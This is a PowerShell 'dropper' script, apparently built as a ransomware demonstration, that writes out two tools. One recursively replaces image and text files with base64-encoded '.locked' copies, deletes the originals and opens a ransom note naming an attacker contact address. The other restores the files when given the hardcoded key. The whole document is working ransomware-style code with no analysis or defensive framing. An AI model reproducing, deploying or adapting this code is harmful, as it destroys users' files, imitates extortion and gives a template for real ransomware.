# Stage 1: The Dropper (Tool Provisioning)
Write-Host "[*] Provisioning attack tools..." -ForegroundColor Gray

# --- 1. THE ENCRYPTOR (Flexible Tool) ---
$encCode = @'
param(
    [string]$Target = ".\",  # Defaults to current folder if no path provided
    [string]$SecretKey = "AI-DEMO-2026"
)

# Resolve full path for clarity
$ResolvedPath = (Resolve-Path $Target).Path
$ransomNotePath = Join-Path $ResolvedPath "READ_ME_NOW.txt"

Write-Host "[!] TARGET ACQUIRED: $ResolvedPath" -ForegroundColor Red

if (!(Test-Path $ResolvedPath)) {
    Write-Error "Target path not found!"
    exit
}

# Recursively Encrypt
Get-ChildItem -Path $ResolvedPath -Include *.jpg,*.png,*.txt -Recurse | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    $encoded = [System.Convert]::ToBase64String($content)
    $encoded | Set-Content ($_.FullName + ".locked")
    Remove-Item $_.FullName
    Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
}

# Create Ransom Note
$noteContent = @"
YOUR FILES ARE ENCRYPTED.
TARGET: $ResolvedPath
KEY ID: $SecretKey
CONTACT: ATTACKER@DARKWEB.COM
"@
$noteContent | Set-Content $ransomNotePath

# Trigger Pop-up
Start-Process notepad.exe $ransomNotePath
'@

# --- 2. THE DECRYPTOR (Flexible Tool) ---
$decCode = @'
param(
    [string]$Key,
    [string]$Target = ".\"
)

# Resolve full path
$ResolvedPath = (Resolve-Path $Target).Path

if ($Key -eq "AI-DEMO-2026") {
    Write-Host "[+] Key Validated. Scanning $ResolvedPath..." -ForegroundColor Green
    Get-ChildItem -Path $ResolvedPath -Filter *.locked -Recurse | ForEach-Object {
        $encoded = Get-Content $_.FullName
        $decoded = [System.Convert]::FromBase64String($encoded)
        $originalName = $_.FullName.Replace(".locked", "")
        [System.IO.File]::WriteAllBytes($originalName, $decoded)
        Remove-Item $_.FullName
        Write-Host "RESTORED: $(Split-Path $originalName -Leaf)" -ForegroundColor Cyan
    }
} else {
    Write-Host "[-] ACCESS DENIED. WRONG KEY." -ForegroundColor Red
}
'@

# --- 3. UNPACKING ---
$encCode | Set-Content .\encrypt.ps1
$decCode | Set-Content .\decrypt.ps1

Write-Host "[+] Tools extracted: encrypt.ps1, decrypt.ps1" -ForegroundColor Green
